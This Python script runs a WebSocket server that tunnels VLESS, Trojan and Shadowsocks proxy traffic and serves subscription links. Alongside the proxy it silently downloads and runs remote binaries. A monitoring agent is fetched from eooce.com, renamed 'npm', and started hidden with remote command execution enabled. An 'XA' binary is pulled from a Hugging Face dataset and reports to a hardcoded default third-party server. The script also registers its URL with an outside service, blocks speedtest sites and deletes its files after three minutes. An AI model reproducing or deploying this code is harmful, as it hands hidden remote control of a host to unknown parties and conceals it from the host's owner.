#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import socket
import struct
import hashlib
import base64
import asyncio
import aiohttp
import logging
import ipaddress
import subprocess
import platform
from aiohttp import web

# 环境变量
UUID = os.environ.get('UUID', '7bd180e8-1142-4387-93f5-03e8d750a896')
NEZHA_SERVER = os.environ.get('NEZHA_SERVER', '')
NEZHA_PORT = os.environ.get('NEZHA_PORT', '')
NEZHA_KEY = os.environ.get('NEZHA_KEY', '')
XA_SERVER = os.environ.get('XA_SERVER', 'https://s0tzhd.qilan.sbs')  # XA 上报地址
DOMAIN = os.environ.get('DOMAIN', '')
SUB_PATH = os.environ.get('SUB_PATH', 'sub')
NAME = os.environ.get('NAME', '')
WSPATH = os.environ.get('WSPATH', UUID[:8])
PORT = int(os.environ.get('SERVER_PORT') or os.environ.get('PORT') or 3000)
AUTO_ACCESS = os.environ.get('AUTO_ACCESS', '').lower() == 'true'
DEBUG = os.environ.get('DEBUG', '').lower() == 'true'

CurrentDomain = DOMAIN
CurrentPort = 443
Tls = 'tls'
ISP = ''
_xa_proc = None

DNS_SERVERS = ['8.8.4.4', '1.1.1.1']
BLOCKED_DOMAINS = [
    'speedtest.net', 'fast.com', 'speedtest.cn', 'speed.cloudflare.com', 'speedof.me',
    'testmy.net', 'bandwidth.place', 'speed.io', 'librespeed.org', 'speedcheck.org'
]

log_level = logging.DEBUG if DEBUG else logging.INFO
logging.basicConfig(level=log_level, format='%(asctime)s - %(levelname)s - %(message)s')
logging.getLogger('aiohttp.access').setLevel(logging.WARNING)
logging.getLogger('aiohttp.server').setLevel(logging.WARNING)
logging.getLogger('aiohttp.client').setLevel(logging.WARNING)
logging.getLogger('aiohttp.internal').setLevel(logging.WARNING)
logging.getLogger('aiohttp.websocket').setLevel(logging.WARNING)
logger = logging.getLogger(__name__)

def is_port_available(port, host='0.0.0.0'):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.bind((host, port))
            return True
        except OSError:
            return False

def find_available_port(start_port, max_attempts=100):
    for port in range(start_port, start_port + max_attempts):
        if is_port_available(port):
            return port
    return None

def is_blocked_domain(host: str) -> bool:
    if not host: return False
    host_lower = host.lower()
    return any(host_lower == blocked or host_lower.endswith('.' + blocked) for blocked in BLOCKED_DOMAINS)

def get_arch():
    machine = platform.machine().lower()
    return 'arm64' if ('arm' in machine or 'aarch64' in machine) else 'amd64'

async def get_isp():
    global ISP
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get('https://api.ip.sb/geoip', headers={'User-Agent': 'Mozilla/5.0'}, timeout=3) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    ISP = f"{data.get('country_code', '')}-{data.get('isp', '')}".replace(' ', '_')
                    return
    except: pass
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get('http://ip-api.com/json', headers={'User-Agent': 'Mozilla/5.0'}, timeout=3) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    ISP = f"{data.get('countryCode', '')}-{data.get('org', '')}".replace(' ', '_')
                    return
    except: pass
    ISP = 'Unknown'

async def get_ip():
    global CurrentDomain, Tls, CurrentPort
    if not DOMAIN or DOMAIN == 'your-domain.com':
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get('https://api-ipv4.ip.sb/ip', timeout=5) as resp:
                    if resp.status == 200:
                        ip = await resp.text()
                        CurrentDomain = ip.strip()
                        Tls = 'none'
                        CurrentPort = PORT
        except Exception as e:
            CurrentDomain = 'change-your-domain.com'
            Tls = 'tls'
            CurrentPort = 443
    else:
        CurrentDomain = DOMAIN
        Tls = 'tls'
        CurrentPort = 443

async def resolve_host(host: str) -> str:
    try:
        ipaddress.ip_address(host)
        return host
    except: pass
    for dns_server in DNS_SERVERS:
        try:
            async with aiohttp.ClientSession() as session:
                url = f'https://dns.google/resolve?name={host}&type=A'
                async with session.get(url, timeout=5) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        if data.get('Status') == 0 and data.get('Answer'):
                            for answer in data['Answer']:
                                if answer.get('type') == 1:
                                    return answer.get('data')
        except: continue
    return host

class ProxyHandler:
    def __init__(self, uuid: str):
        self.uuid = uuid
        self.uuid_bytes = bytes.fromhex(uuid)

    async def handle_vless(self, websocket, first_msg: bytes) -> bool:
        try:
            if len(first_msg) < 18 or first_msg[0] != 0: return False
            if first_msg[1:17] != self.uuid_bytes: return False
            i = first_msg[17] + 19
            if i + 3 > len(first_msg): return False
            port = struct.unpack('!H', first_msg[i:i+2])[0]; i += 2
            atyp = first_msg[i]; i += 1
            host = ''
            if atyp == 1:
                if i + 4 > len(first_msg): return False
                host = '.'.join(str(b) for b in first_msg[i:i+4]); i += 4
            elif atyp == 2:
                if i >= len(first_msg): return False
                hl = first_msg[i]; i += 1
                host = first_msg[i:i+hl].decode(); i += hl
            elif atyp == 3:
                if i + 16 > len(first_msg): return False
                host = ':'.join(f'{(first_msg[j] << 8) + first_msg[j+1]:04x}' for j in range(i, i+16, 2)); i += 16
            else: return False
            if is_blocked_domain(host): await websocket.close(); return False
            await websocket.send_bytes(bytes([0, 0]))
            resolved = await resolve_host(host)
            reader, writer = await asyncio.open_connection(resolved, port)
            if i < len(first_msg): writer.write(first_msg[i:]); await writer.drain()
            async def fwd_ws():
                try:
                    async for msg in websocket:
                        if msg.type == aiohttp.WSMsgType.BINARY:
                            writer.write(msg.data); await writer.drain()
                except: pass
                finally: writer.close(); await writer.wait_closed()
            async def fwd_tcp():
                try:
                    while True:
                        data = await reader.read(4096)
                        if not data: break
                        await websocket.send_bytes(data)
                except: pass
            await asyncio.gather(fwd_ws(), fwd_tcp())
            return True
        except: return False

    async def handle_trojan(self, websocket, first_msg: bytes) -> bool:
        try:
            if len(first_msg) < 58: return False
            rh = first_msg[:56].decode('ascii', errors='ignore')
            h1 = hashlib.sha224(self.uuid.encode()).hexdigest()
            h2 = hashlib.sha224(UUID.encode()).hexdigest()
            if rh != h1 and rh != h2: return False
            off = 56
            if first_msg[off:off+2] == b'\r\n': off += 2
            if first_msg[off] != 1: return False; off += 1
            atyp = first_msg[off]; off += 1
            host = ''
            if atyp == 1:
                host = '.'.join(str(b) for b in first_msg[off:off+4]); off += 4
            elif atyp == 3:
                hl = first_msg[off]; off += 1
                host = first_msg[off:off+hl].decode(); off += hl
            elif atyp == 4:
                host = ':'.join(f'{(first_msg[j] << 8) + first_msg[j+1]:04x}' for j in range(off, off+16, 2)); off += 16
            else: return False
            port = struct.unpack('!H', first_msg[off:off+2])[0]; off += 2
            if first_msg[off:off+2] == b'\r\n': off += 2
            if is_blocked_domain(host): await websocket.close(); return False
            resolved = await resolve_host(host)
            reader, writer = await asyncio.open_connection(resolved, port)
            if off < len(first_msg): writer.write(first_msg[off:]); await writer.drain()
            async def fwd_ws():
                try:
                    async for msg in websocket:
                        if msg.type == aiohttp.WSMsgType.BINARY:
                            writer.write(msg.data); await writer.drain()
                except: pass
                finally: writer.close(); await writer.wait_closed()
            async def fwd_tcp():
                try:
                    while True:
                        data = await reader.read(4096)
                        if not data: break
                        await websocket.send_bytes(data)
                except: pass
            await asyncio.gather(fwd_ws(), fwd_tcp())
            return True
        except: return False

    async def handle_shadowsocks(self, websocket, first_msg: bytes) -> bool:
        try:
            if len(first_msg) < 7: return False
            off = 0
            atyp = first_msg[off]; off += 1
            host = ''
            if atyp == 1:
                host = '.'.join(str(b) for b in first_msg[off:off+4]); off += 4
            elif atyp == 3:
                hl = first_msg[off]; off += 1
                host = first_msg[off:off+hl].decode(); off += hl
            elif atyp == 4:
                host = ':'.join(f'{(first_msg[j] << 8) + first_msg[j+1]:04x}' for j in range(off, off+16, 2)); off += 16
            else: return False
            port = struct.unpack('!H', first_msg[off:off+2])[0]; off += 2
            if is_blocked_domain(host): await websocket.close(); return False
            resolved = await resolve_host(host)
            reader, writer = await asyncio.open_connection(resolved, port)
            if off < len(first_msg): writer.write(first_msg[off:]); await writer.drain()
            async def fwd_ws():
                try:
                    async for msg in websocket:
                        if msg.type == aiohttp.WSMsgType.BINARY:
                            writer.write(msg.data); await writer.drain()
                except: pass
                finally: writer.close(); await writer.wait_closed()
            async def fwd_tcp():
                try:
                    while True:
                        data = await reader.read(4096)
                        if not data: break
                        await websocket.send_bytes(data)
                except: pass
            await asyncio.gather(fwd_ws(), fwd_tcp())
            return True
        except: return False

async def websocket_handler(request):
    ws = web.WebSocketResponse()
    await ws.prepare(request)
    CUUID = UUID.replace('-', '')
    if f'/{WSPATH}' not in request.path:
        await ws.close(); return ws
    proxy = ProxyHandler(CUUID)
    try:
        first_msg = await asyncio.wait_for(ws.receive(), timeout=5)
        if first_msg.type != aiohttp.WSMsgType.BINARY:
            await ws.close(); return ws
        msg_data = first_msg.data
        if len(msg_data) > 17 and msg_data[0] == 0 and await proxy.handle_vless(ws, msg_data):
            return ws
        if len(msg_data) >= 58 and await proxy.handle_trojan(ws, msg_data):
            return ws
        if len(msg_data) > 0 and msg_data[0] in (1, 3, 4) and await proxy.handle_shadowsocks(ws, msg_data):
            return ws
        await ws.close()
    except asyncio.TimeoutError:
        await ws.close()
    except Exception as e:
        await ws.close()
    return ws

async def http_handler(request):
    if request.path == '/':
        try:
            with open('index.html', 'r', encoding='utf-8') as f:
                return web.Response(text=f.read(), content_type='text/html')
        except:
            return web.Response(text='Hello world!', content_type='text/html')
    elif request.path == f'/{SUB_PATH}':
        await get_isp(); await get_ip()
        name_part = f"{NAME}-{ISP}" if NAME else ISP
        tls_param = 'tls' if Tls == 'tls' else 'none'
        ss_tls = 'tls;' if Tls == 'tls' else ''
        vless_url = f"vless://{UUID}@{CurrentDomain}:{CurrentPort}?encryption=none&security={tls_param}&sni={CurrentDomain}&fp=chrome&type=ws&host={CurrentDomain}&path=%2F{WSPATH}#{name_part}"
        trojan_url = f"trojan://{UUID}@{CurrentDomain}:{CurrentPort}?security={tls_param}&sni={CurrentDomain}&fp=chrome&type=ws&host={CurrentDomain}&path=%2F{WSPATH}#{name_part}"
        ss_mp = base64.b64encode(f"none:{UUID}".encode()).decode()
        ss_url = f"ss://{ss_mp}@{CurrentDomain}:{CurrentPort}?plugin=v2ray-plugin;mode%3Dwebsocket;host%3D{CurrentDomain};path%3D%2F{WSPATH};{ss_tls}sni%3D{CurrentDomain};skip-cert-verify%3Dtrue;mux%3D0#{name_part}"
        sub = base64.b64encode(f"{vless_url}\n{trojan_url}\n{ss_url}".encode()).decode()
        return web.Response(text=sub + '\n', content_type='text/plain')
    return web.Response(status=404, text='Not Found\n')

def get_download_url():
    arch = platform.machine().lower()
    if 'arm' in arch or 'aarch64' in arch:
        return 'https://arm64.eooce.com/agent' if NEZHA_PORT else 'https://arm64.eooce.com/v1'
    return 'https://amd64.eooce.com/agent' if NEZHA_PORT else 'https://amd64.eooce.com/v1'

async def download_file(url, dest, timeout=15):
    async with aiohttp.ClientSession() as session:
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=timeout)) as resp:
            if resp.status == 200:
                with open(dest, 'wb') as f:
                    f.write(await resp.read())
                os.chmod(dest, 0o755)

async def run_nezha():
    if not NEZHA_SERVER and not NEZHA_KEY:
        logger.info('nezha varibles is empty, skipping')
        return
    try:
        result = subprocess.run(['ps', 'aux'], capture_output=True, text=True)
        if './npm' in result.stdout and '[n]pm' in result.stdout: return
    except: pass
    try:
        await download_file(get_download_url(), 'npm', 30)
    except: return
    command = ''
    tls_ports = ['443', '8443', '2096', '2087', '2083', '2053']
    if NEZHA_SERVER and NEZHA_PORT and NEZHA_KEY:
        tls = '--tls' if NEZHA_PORT in tls_ports else ''
        command = f'nohup ./npm -s {NEZHA_SERVER}:{NEZHA_PORT} -p {NEZHA_KEY} {tls} --disable-auto-update --report-delay 4 --skip-conn --skip-procs >/dev/null 2>&1 &'
    elif NEZHA_SERVER and NEZHA_KEY:
        if not NEZHA_PORT:
            port = NEZHA_SERVER.split(':')[-1] if ':' in NEZHA_SERVER else ''
            nz_tls = 'true' if port in tls_ports else 'false'
            config = f"""client_secret: {NEZHA_KEY}
debug: false
disable_auto_update: true
disable_command_execute: false
disable_force_update: true
disable_nat: false
disable_send_query: false
gpu: false
insecure_tls: true
ip_report_period: 1800
report_delay: 4
server: {NEZHA_SERVER}
skip_connection_count: true
skip_procs_count: true
temperature: false
tls: {nz_tls}
use_gitee_to_upgrade: false
use_ipv6_country_code: false
uuid: {UUID}"""
            with open('config.yaml', 'w') as f: f.write(config)
        command = f'nohup ./npm -c config.yaml >/dev/null 2>&1 &'
    else: return
    try:
        subprocess.Popen(command, shell=True, executable='/bin/bash')
    except: pass

# ==================== XA 启动 ====================
async def start_xa():
    global _xa_proc
    if not XA_SERVER or not UUID: return
    arch = get_arch()
    xa_url = f'https://huggingface.co/datasets/Qilan2/st-server/resolve/main/XA-linux-{arch}?download=true'
    xa_path = os.path.join(os.getcwd(), 'xa')
    if not os.path.exists(xa_path):
        try:
            await download_file(xa_url, xa_path, 30)
        except:
            return
    try:
        _xa_proc = subprocess.Popen(
            [xa_path, 'start', '-s', XA_SERVER, '-p', UUID],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
    except:
        pass

async def add_access_task():
    if not AUTO_ACCESS or not DOMAIN: return
    full_url = f"https://{DOMAIN}/{SUB_PATH}"
    try:
        async with aiohttp.ClientSession() as session:
            await session.post("https://oooo.serv00.net/add-url",
                             json={"url": full_url},
                             headers={'Content-Type': 'application/json'})
    except: pass

def cleanup_files():
    for file in ['npm', 'config.yaml']:
        try:
            if os.path.exists(file): os.remove(file)
        except: pass

async def main():
    global _xa_proc
    actual_port = PORT
    if not is_port_available(actual_port):
        new_port = find_available_port(actual_port + 1)
        if new_port: actual_port = new_port
        else: sys.exit(1)
    app = web.Application()
    app.router.add_get('/', http_handler)
    app.router.add_get(f'/{SUB_PATH}', http_handler)
    app.router.add_get(f'/{WSPATH}', websocket_handler)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', actual_port)
    await site.start()
    asyncio.create_task(run_nezha())
    asyncio.create_task(start_xa())
    async def delayed_cleanup():
        await asyncio.sleep(180)
        cleanup_files()
    asyncio.create_task(delayed_cleanup())
    await add_access_task()
    try:
        await asyncio.Future()
    except KeyboardInterrupt:
        pass
    finally:
        if _xa_proc: _xa_proc.kill()
        await runner.cleanup()

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        cleanup_files()